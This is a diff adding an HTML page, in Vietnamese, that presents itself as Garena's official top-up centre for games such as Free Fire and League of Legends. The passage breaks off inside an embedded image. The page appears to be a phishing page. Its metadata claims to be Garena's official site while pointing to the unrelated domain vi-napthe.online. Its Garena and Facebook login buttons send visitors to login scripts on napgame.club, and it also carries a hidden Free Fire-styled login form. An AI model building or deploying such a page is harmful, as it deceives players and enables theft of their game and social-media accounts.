@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1 , maximum-scale=1, user-scalable=no, viewport-fit=cover">
+    <title>Trung tâm nạp thẻ Garena</title>
+    <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/favicon.ico">
+    <link href="css/base.css" rel="stylesheet" />
+    <link rel="stylesheet" href="js/slick/slick.css">
+    <meta key="description" name="description"
+        content="Trang nạp thẻ chính thức của Garena. Nạp Sò, nạp Quân Huy, nạp RP, nạp EP dễ dàng và an toàn cho các game Garena như Liên Minh Huyền Thoại, FIFA ONLINE 3, FO3M, Blade and Soul, Liên Quân Mobile, Chiến Dịch Huyền Thoại, DDTank, Free Fire, Âm Dương Sư."
+        data-react-helmet="true">
+    <meta key="keywords" name="keywords" content="nạp tiền, garena, game, games" data-react-helmet="true">
+    <meta key="twitter:title" name="twitter:title" content="Trung tâm nạp thẻ Garena" data-react-helmet="true">
+    <meta key="twitter:description" name="twitter:description"
+        content="Trang nạp thẻ chính thức của Garena. Nạp Sò, nạp Quân Huy, nạp RP, nạp EP dễ dàng và an toàn cho các game Garena như Liên Minh Huyền Thoại, FIFA ONLINE 3, FO3M, Blade and Soul, Liên Quân Mobile, Chiến Dịch Huyền Thoại, DDTank, Free Fire, Âm Dương Sư."
+        data-react-helmet="true">
+    <meta key="og:title" property="og:title" content="Trung tâm nạp thẻ Garena" data-react-helmet="true">
+    <meta key="og:type" property="og:type" content="website" data-react-helmet="true">
+    <meta key="og:image" property="og:image"
+        content="../cdngarenanow-a.akamaihd.net/webmain/static/payment_center/common/garena-logo.png"
+        data-react-helmet="true">
+    <meta key="og:url" property="og:url" content="https://vi-napthe.online" data-react-helmet="true">
+    <meta key="og:description" property="og:description"
+        content="Trang nạp thẻ chính thức của Garena. Nạp Sò, nạp Quân Huy, nạp RP, nạp EP dễ dàng và an toàn cho các game Garena như Liên Minh Huyền Thoại, FIFA ONLINE 3, FO3M, Blade and Soul, Liên Quân Mobile, Chiến Dịch Huyền Thoại, DDTank, Free Fire, Âm Dương Sư."
+        data-react-helmet="true">
+    <script type="text/javascript" src="js/jquery-3.3.1.js"></script>
+    <script type="text/javascript" src="js/slick/slick.js"></script>
+    <link href="css/style.css" rel="stylesheet" />
+    <link href="css/loginFreeFire.css" rel="stylesheet" />
+
+    <script type="text/javascript" src="js/style.js"></script>
+</head>
+
+<body>
+    <div class="s-header-1">
+        <div class="container align-items--between">
+            <a href="index-2.html" class="hd-logo"><img src="images/logo.png" alt=""></a>
+            <div class="hd-menu">
+                <a href="javascript:;" ht-trigger="hd-menu"><span>☰</span><span>×</span></a>
+            </div>
+            <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin" class="hd-button"><img class="logged"
+                    src="images/user-2.png" alt=""> <span class="name">Đăng nhập</span></a>
+        </div>
+    </div>
+    <a href="javascript:;" id="btnmodalPopup" ht-trigger="c-modal" ht-target="#modalPopup" style="display:none"></a>
+    <div id="modalPopup" class="c-modal" ht-close="c-modal">
+        <div class="c-modal-box">
+            <div class="c-modal-group" ht-skip="parent">
+                <div class="c_body" style="text-align:center">
+                    <img src="images/banner.png" />
+
+
+                    <div class="banner_4">
+                        <div class="">
+                            <input class="banner_5" type="submit" ht-close="c-modal" value="Đóng">
+                        </div>
+                    </div>
+
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="modalLogin" class="c-modal" ht-close="c-modal">
+        <div class="c-modal-box">
+            <div class="c-modal-group" ht-skip="parent">
+                <div class="c_close text--white" ht-close="c-modal"><img src="images/close.png" alt=""></div>
+                <div class="c_body">
+                    <div class="s-login-1">
+                        <div class="s_title">Bảng điều khiển đăng nhập</div>
+                        <div class="s_button">
+                            <a href="https://napgame.club/api/v1/login_garena.php"><img src="images/garena.png" alt="">
+                                <span>Garena</span></a>
+                            <a href="https://napgame.club/api/v1/login_facebook.php"><img src="images/facebook.png"
+                                    alt=""> <span>Facebook</span></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="modalLogin2" class="c-modal c-modal-freefire" ht-close="c-modal" >
+        <div class="c-modal-box c-modal-box-freefire">
+            <div id="loginForm" style="display:none" ht-skip="parent">
+                <div class="loginForm_container">
+                    <div class="base_container">
+                        <div class="base_detail_container">
+                            <div class="btnClose" onclick="closeLogin()" ht-close="c-modal"></div>
+                            <img class="logo_freeFire"
+                                src="images/faifai.png">
+                            <div class="freeFire_text_item">Free Fire</div>
+                            <div class="text_login_with">Đăng nhập với</div>
+                            <div class="plats_login">
+                                <img src="data:image/png;base64,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"
+                                    class="item_plats"><img
+                                    src="data:image/png;base64,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